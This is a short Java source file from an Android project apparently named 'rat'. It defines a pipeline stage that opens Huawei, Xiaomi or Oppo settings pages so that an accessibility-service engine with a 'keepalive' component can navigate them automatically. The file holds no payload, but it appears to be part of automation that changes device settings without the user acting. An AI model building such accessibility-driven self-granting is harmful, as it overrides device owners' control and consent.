package com.vendor.rat.auto.pipeline.stage;

import android.util.Log;

import com.vendor.rat.auto.pipeline.PipelineContext;
import com.vendor.rat.auto.pipeline.PipelineStage;
import com.vendor.rat.keepalive.thread.StrategyThread;
import com.vendor.rat.service.MyAccessibilityService;

/**
 * Stage 4: 启动厂商设置页
 *
 * 先按 HOME 回桌面（确保 WINDOW_STATE_CHANGED 事件触发），
 * 再启动对应厂商的设置页面。
 * 引擎通过监听无障碍事件被动检测窗口变化并自动导航。
 */
public class LaunchSettingsStage implements PipelineStage {

    private static final String TAG = "LaunchSettingsStage";

    @Override
    public void handle(PipelineContext passable, Runnable next) {
        // Skip for unsupported devices
        if (!passable.isHuawei() && !passable.isXiaomi() && !passable.isOppo()) {
            next.run();
            return;
        }

        MyAccessibilityService svc = passable.getService();
        if (svc == null) {
            Log.d(TAG, "AccessibilityService not available");
            return;
        }

        // 委托给 StrategyThread 的现有方法
        StrategyThread.launchSettingsForVendor(passable.getAppContext(), svc);

        Log.d(TAG, "Vendor settings page launched");
        next.run();
    }
}
